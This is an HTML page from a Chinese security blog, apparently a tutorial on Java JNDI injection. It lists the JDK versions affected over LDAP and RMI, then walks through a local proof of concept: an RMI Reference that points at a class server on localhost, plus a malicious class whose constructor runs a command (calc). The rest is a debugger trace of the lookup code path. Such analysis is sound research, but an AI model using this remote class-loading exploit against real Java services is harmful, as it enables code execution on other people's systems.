@@ -1,0 +1,886 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
+  <link rel="icon" href="/img/candy.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#7732b1">
+  <meta name="author" content="Candy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="因为 jndi 的内容比较多，我们从官方文档去看，专挑和安全有关系的地方看。 官方文档地址：https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;tutorial&#x2F;jndi&#x2F;overview&#x2F;index.html 一、jndi基本介绍 什么是jndi？它的作用是什么？  根据官方文档，JNDI 全称为 Java Naming and Directory Interface，即 Java 名">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化之jndi注入">
+<meta property="og:url" content="http://candyb0x.github.io/2024/08/13/jndi%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Welcome Candy Box">
+<meta property="og:description" content="因为 jndi 的内容比较多，我们从官方文档去看，专挑和安全有关系的地方看。 官方文档地址：https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;tutorial&#x2F;jndi&#x2F;overview&#x2F;index.html 一、jndi基本介绍 什么是jndi？它的作用是什么？  根据官方文档，JNDI 全称为 Java Naming and Directory Interface，即 Java 名">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833824.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833661.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833710.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833546.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833898.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833404.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833296.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071834250.png">
+<meta property="article:published_time" content="2024-08-12T17:16:32.000Z">
+<meta property="article:modified_time" content="2025-08-17T10:06:29.496Z">
+<meta property="article:author" content="Candy">
+<meta property="article:tag" content="jndi">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="rmi">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833824.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java反序列化之jndi注入 - Welcome Candy Box</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Candy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/essay/" target="_self">
+                <i class="iconfont icon-note"></i>
+                <span>随笔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java反序列化之jndi注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Candy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-13 01:16" pubdate>
+          2024年8月13日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          37 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java反序列化之jndi注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>因为 jndi 的内容比较多，我们从官方文档去看，专挑和安全有关系的地方看。</p>
+<p>官方文档地址：<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">https://docs.oracle.com/javase/tutorial/jndi/overview/index.html</a></p>
+<h1 id="一、jndi基本介绍"><a href="#一、jndi基本介绍" class="headerlink" title="一、jndi基本介绍"></a>一、jndi基本介绍</h1><ol>
+<li>什么是jndi？它的作用是什么？</li>
+</ol>
+<p>根据官方文档，JNDI 全称为 <strong>Java Naming and Directory Interface</strong>，即 Java 名称与目录接口。也就是一个名字对应一个 Java 对象。也可以说是一个字符串对应的java对象；</p>
+<p>jndi 在 jdk 里面支持以下四种服务：</p>
+<ol>
+<li>LDAP：轻量级目录访问协议</li>
+<li>通用对象请求代理架构(CORBA)；通用对象服务(COS)名称服务；</li>
+<li>Java远程方法调用(RMI)注册表</li>
+<li>DNS服务</li>
+</ol>
+<p>前三种都是字符串对应对象，DNS服务是IP对应域名；</p>
+<h2 id="1-1-jndi的代码以及包说明"><a href="#1-1-jndi的代码以及包说明" class="headerlink" title="1.1 jndi的代码以及包说明"></a>1.1 jndi的代码以及包说明</h2><p>jndi主要是上述四种服务，对应四个包加一个主包；</p>
+<p>jndi接口主要分为下面5个包：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html">javax.naming</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html">javax.naming.directory</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html">javax.naming.event</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html">javax.naming.ldap</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html">javax.naming.spi</a></li>
+</ul>
+<p>其中最重要的是javax.naming包，包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。 以上述打印机服务为例，通过 jndi 接口，用户可以透明地调用远程打印服务，伪代码如下所示:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br><span class="hljs-type">Printer</span> <span class="hljs-variable">printer</span> <span class="hljs-operator">=</span> (Printer)ctx.lookup(<span class="hljs-string">&quot;myprinter&quot;</span>);<br>printer.print(report);<br></code></pre></td></tr></table></figure>
+
+<p>Jndi 在对不同服务进行调用的时候，会去调用 xxxContext 这个类，比如调用 RMI 服务的时候就是调的 RegistryContext，这一点是很重要的，记住了这一点对于 JNDI 这里的漏洞理解非常有益。</p>
+<p>一般的应用也就是先 <code>new InitialContext()</code>，再调用 API 即可，下面我们先看一个 JNDI 结合 RMI 的代码实例。</p>
+<h2 id="1-2-jndi注入限制条件"><a href="#1-2-jndi注入限制条件" class="headerlink" title="1.2 jndi注入限制条件"></a>1.2 jndi注入限制条件</h2><table>
+<thead>
+<tr>
+<th><strong>协议</strong></th>
+<th><strong>JDK6</strong></th>
+<th><strong>JDK7</strong></th>
+<th><strong>JDK8</strong></th>
+<th><strong>JDK11</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LADP</td>
+<td>6u211以下</td>
+<td>7u201以下</td>
+<td>8u191以下</td>
+<td>11.0.1以下</td>
+</tr>
+<tr>
+<td>RMI</td>
+<td>6u132以下</td>
+<td>7u122以下</td>
+<td>8u113以下</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<h1 id="二、jndi的利用方式，代码以及一些漏洞"><a href="#二、jndi的利用方式，代码以及一些漏洞" class="headerlink" title="二、jndi的利用方式，代码以及一些漏洞"></a>二、jndi的利用方式，代码以及一些漏洞</h1><h2 id="2-1-jndi结合RMI"><a href="#2-1-jndi结合RMI" class="headerlink" title="2.1 jndi结合RMI"></a>2.1 jndi结合RMI</h2><p>新建两个模块，分别放置服务端和客户端，代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiRmiServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiRmiClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">RemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (RemoteObj)initialContext.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1/remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-1-1-RMI原生漏洞"><a href="#2-1-1-RMI原生漏洞" class="headerlink" title="2.1.1 RMI原生漏洞"></a>2.1.1 RMI原生漏洞</h3><p>这里的 api 虽然是 JNDI 的服务的，但是实际上确实调用到 RMI 的库里面的，这里我们先打断点调试一下，证明 jndi 的 api 实际上是调用了 RMI 的库里原生的 <code>lookup()</code> 方法。</p>
+<p>断点的话，下一个在 <code>InitialContext.java</code> 的 <code>lookup()</code> 方法这里即可，开始调试。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833824.png" srcset="/img/loading.gif" lazyload></p>
+<p>进到 <code>lookup()</code> 方法里面进去，这里 <code>GenericURLContext</code> 类的 <code>lookup()</code> 方法里面又套了一个 <code>lookup()</code> 方法，我们继续进去。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833661.png" srcset="/img/loading.gif" lazyload></p>
+<p>进去之后发现这个类是 <code>RegistryContext</code>，也就是 RMI 对应 <code>lookup()</code> 方法的类，至此，可以基本说明<strong>JNDI 调用 RMI 服务的时候，虽然 API 是 JNDI 的，但是还是去调用了原生的 RMI 服务。</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833710.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以说，如果 JNDI 这里是和 RMI 结合起来使用的话，RMI 中存在的漏洞，JNDI 这里也会有。但这并不是 JNDI 的传统意义上的漏洞。</p>
+<h3 id="2-1-2-引用的漏洞（Normal-Jndi）"><a href="#2-1-2-引用的漏洞（Normal-Jndi）" class="headerlink" title="2.1.2 引用的漏洞（Normal Jndi）"></a>2.1.2 引用的漏洞（Normal Jndi）</h3><blockquote>
+<p>这个漏洞被称作 Jndi 注入漏洞，它与所调用服务无关，不论你是 RMI，DNS，LDAP 或者是其他的，都会存在这个问题。</p>
+</blockquote>
+<p>原理是在服务端调用了一个 <code>Reference</code> 对象，我个人的理解，它是很像代理的。</p>
+<p>Reference对象创建的时候的三个参数的意义：</p>
+<ul>
+<li><code>**String className**</code>：表示要创建的资源的完全限定类名。用于在查找时确定具体的资源类型。</li>
+<li><code>**StringFactory**</code>（可选）：指定一个 <code>ObjectFactory</code> 的类名，用于在查找时创建实际的对象实例。若不指定，JNDI 会尝试默认构造。</li>
+<li><code>**StringRefAddr[]**</code>：通过 <code>StringRefAddr</code> 对象传递属性，通常用于定义资源的配置，比如数据库连接的 URL、用户名和密码等。每个 <code>StringRefAddr</code> 包含一个名称和值，用于描述具体的配置项。</li>
+</ul>
+<p>代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;  <br><span class="hljs-keyword">import</span> javax.naming.Reference;  <br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;  <br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>         <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();  <br>         <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);  <br>         <span class="hljs-comment">// RMI的JNDI注入漏洞</span><br>         <span class="hljs-comment">// initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl()); // JNDI 注入漏洞  </span><br>         <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Calc&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>,<span class="hljs-string">&quot;http://localhost:7777/&quot;</span>);  <br>         initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);  <br>        &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们看到这个地方，原本我们是这样的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>());<br></code></pre></td></tr></table></figure>
+
+<p>直接是绑定了一个对象，而在 jndi 里面，我们可以通过 new 一个 Reference 类的方法来解决。然后再 rebind 调用它，这个思路有点像代理吧，然后调用它这个很像 URLClassLoader。有兴趣的师傅可以跟一下断点。</p>
+<p>如果要攻击的话，也很简单，我们在 URLClassLoader 这个获取的方法里面添加恶意类就可以了，比如我这里是 Calc.exe 这个恶意命令调用，代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后通过python起服务器运行启动即可；</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 7777<br></code></pre></td></tr></table></figure>
+
+<p>如果是使用上述代码进行程序运行，是一定会报错的，因为服务端这里还是调用sayHello()，但是我们实际上查找到的是远程的Calc.class，Calc.class类上是没有sayHello这个方法的，因为导致无法调用sayHello报错；</p>
+<ul>
+<li>开始调试，查找漏洞点；断点依旧打在lookup()这个地方一步一步查找；</li>
+</ul>
+<p>我们的目的是为了了解漏洞出发的原因，恶意类是如何出发的，怎么调用构造函数使得命令执行的？</p>
+<p>跟进几个 <code>lookup()</code> 方法，直到去到 RMI 的原生的 <code>lookup()</code>，对应的类我也在前文提及过了，是 <code>RegistryContext</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833546.png" srcset="/img/loading.gif" lazyload></p>
+<p>在<code>RegistryContext</code>类中的var2变量对应的是从远程类中获取的到的obj变量，把Ref的值赋给了它。obj是一个<code>ReferenceWrapper_Stub</code>类的变量，因为这是一个Reference。</p>
+<p>接着跟进<code>decodeObject()</code>方法，查看方法的实现；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833898.png" srcset="/img/loading.gif" lazyload></p>
+<p>先做了一个简单的判断，首先判断var1是否为 <code>ReferenceWrapper</code>，也就是判断是否为 <code>Reference</code> 对象；往下是一个比较重要的方法 <code>getObjectInstance()</code>，从名字上推测这应该是一个初始化的方法。跟进<code>getObjectInstance()</code>查看实现；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object<br>        <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object refInfo, Name name, Context nameCtx,</span><br><span class="hljs-params">                          Hashtable&lt;?,?&gt; environment)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br><br>        ObjectFactory factory;<br><br>        <span class="hljs-comment">// Use builder if installed</span><br>        <span class="hljs-type">ObjectFactoryBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> getObjectFactoryBuilder();<br>        <span class="hljs-keyword">if</span> (builder != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// builder must return non-null factory</span><br>            factory = builder.createObjectFactory(refInfo, environment);<br>            <span class="hljs-keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,<br>                environment);<br>        &#125;<br><br>        <span class="hljs-comment">// Use reference if possible</span><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Reference) &#123;<br>            ref = (Reference) refInfo;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Referenceable) &#123;<br>            ref = ((Referenceable)(refInfo)).getReference();<br>        &#125;<br><br>        Object answer;<br><br>        <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ref.getFactoryClassName();<br>            <span class="hljs-keyword">if</span> (f != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// if reference identifies a factory, use exclusively</span><br><br>                factory = getObjectFactoryFromReference(ref, f);<br>                <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<br>                                                     environment);<br>                &#125;<br>                <span class="hljs-comment">// No factory found, so return original refInfo.</span><br>                <span class="hljs-comment">// Will reach this point if factory class is not in</span><br>                <span class="hljs-comment">// class path and reference does not contain a URL for it</span><br>                <span class="hljs-keyword">return</span> refInfo;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// if reference has no factory, check for addresses</span><br>                <span class="hljs-comment">// containing URLs</span><br><br>                answer = processURLAddrs(ref, name, nameCtx, environment);<br>                <span class="hljs-keyword">if</span> (answer != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> answer;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// try using any specified factories</span><br>        answer =<br>            createObjectFromFactories(refInfo, name, nameCtx, environment);<br>        <span class="hljs-keyword">return</span> (answer != <span class="hljs-literal">null</span>) ? answer : refInfo;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>在这个方法中，首先进行了<code>builder</code>的判断，但是我们并没有使用过想用功能，简单看看就行，应该没用到；</p>
+<p>继续往下看到关于reference的，将传入的<code>refInfo</code>强转为<code>Reference</code>。继续向下看……</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833404.png" srcset="/img/loading.gif" lazyload></p>
+<p>在这里我们看到了关于查找<code>Factory</code>的地方，如果ref中存在factory的定义，则直接通过调用<code>getObjectInstance</code>方法获取对象实例返回；那么，我们现在继续跟进方法的实现；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833296.png" srcset="/img/loading.gif" lazyload></p>
